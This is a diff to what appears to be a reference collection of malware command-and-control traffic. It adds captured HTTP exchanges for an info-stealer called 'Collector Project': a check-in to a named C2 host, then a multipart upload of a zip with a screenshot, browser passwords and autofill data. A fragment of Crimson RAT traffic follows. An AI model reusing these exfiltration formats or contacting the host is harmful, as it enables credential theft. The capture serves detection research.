@@ -556,6 +556,64 @@ Content-Length: 82480
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/cobian.png "Cobian RAT")
 
+#### Collector Project
+~~~
+GET /get_data.php?info HTTP/1.1
+User-Agent: CLCTR
+Host: u667503gif.ha004.t.justns.ru
+Connection: Keep-Alive
+
+HTTP/1.1 200 OK
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+Content-Length: 66
+Date: Fri, 24 Apr 2020 16:45:45 GMT
+Server: LiteSpeed
+Vary: User-Agent
+
+IP-address: 85.203.44.133_=_Country: Netherlands_=_City: Amsterdam
+
+
+POST /get_data.php?id=1874255356&cc=0&pc=1&hash=8f41bab4341b7ac42eb623fad118f430 HTTP/1.1
+Content-Type: multipart/form-data; boundary=SendFileZIPBoundary
+User-Agent: uploader
+Host: u667503gif.ha004.t.justns.ru
+Content-Length: 1191921
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+--SendFileZIPBoundary
+Content-Disposition: form-data; name="fileToUpload"; filename="zipfile.zip"
+Content-Type: application/zip
+
+PK...........P.w..B*..........Screenshot.pngUT
+...%.^.%.^.%.^$.uXS........n.	.......P........!.H...}. *9JB....5:Fm0.........:;...9.....W,...!=
+.O_c.).c.....y>...k...?u...n.5..........k...../...#*.........pt]3.n\g...?PK...........P....I...........Browsers/passwords.txtUT
+...%.^.%.^.%.^.
+..R.())(.....KKLNM....K.......O.......V:.....y........R...@..../W<.....PK...........P
+...7...........Browsers/AutoFill.txtUT
+...%.^.%.^.%.^.K.M.Rp.,*...2y...sJ."..IE..9.\...^.?..>.hF.%..e...Sd6.PK...........P................Browsers/!browsersInfo.txtUT
+...%.^.%.^.%.^.............\.c..)....v..	-N-*.IL....q,(pI,I...ON..q..O.I.q.(..M..S.....%....U.g...b.tu.....K.J...cy.x...;.........	.........Cc...&a...Q^
+ru..qv$&F.PK...........P..m. ...}.......information.txtUT
+...%.^.%.^.%.^-.Oo.0......|..D4.?.
+u 6UP."....x..6U.`.../..|...Y/q...UV.J(..g ...8.r.....!.k.`.Y.)$s.NC........{.+..$.2c.......&..*........Q.U..l....&..^+M_Jk..~..?......D}pd]..Qm...w.X.........6...OW.s6c	..
+/.`..w..U9*..?..o.}.Q..<B..`..5...2-.8..tV.[.$.....G1B)m.	XL..OX..d2./qk....%.!.......i.8OVb..PK.............P.w..B*........	...............Screenshot.pngUT....%.^PK.............P....I.........	............*..Browsers/passwords.txtUT....%.^PK.............P
+...7.........	...........
++..Browsers/AutoFill.txtUT....%.^PK.............P..............	............+..Browsers/!browsersInfo.txtUT....%.^PK.............P..m. ...}.....	...........f,..information.txtUT....%.^PK..........u....-....
+
+--SendFileZIPBoundary--
+
+HTTP/1.1 200 OK
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+Content-Length: 0
+Date: Fri, 24 Apr 2020 16:45:54 GMT
+Server: LiteSpeed
+Vary: User-Agent
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/collectorproject1.png "Collector Project")
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/collectorproject2.png "Collector Project")
+
 #### Crimson RAT
 ~~~
 .....info=command.....subdomain-info=user@....|USER-PC|admin||6>1|Ver-3.1||||C:\ProgramData\Dhrolas\|subdomain.....getavs=avpro.....subdomain-getavs=@....264>smss>0><352>explorer>0><796>svchost>0><348>csrss>0><1232>svchost>0><608>svchost>0><3720>windanr>0><692>svchost>0><708>ctfmon>0><864>svchost>0><1872>SearchIndexer>0><3520>SearchFilterHost>0><1384>IMEDICTUPDATE>0><404>csrss>0><1204>spoolsv>0><3484>SearchProtocolHost>0><1824>svchost>0><396>wininit>0><840>svchost>0><1460>qemu-ga>0><2704>audiodg>0><1000>svchost>0><1944>886c394c284f3f334c0e385fe36ec1022037585810b9e39629fcbdc2ac4d27e1>0><464>lsm>0><552>winlogon>0><1352>svchost>0><280>dwm>0><1080>svchost>0><456>lsass>0><4>System>0><448>services>0><2032>taskeng>0><0>Idle>0><
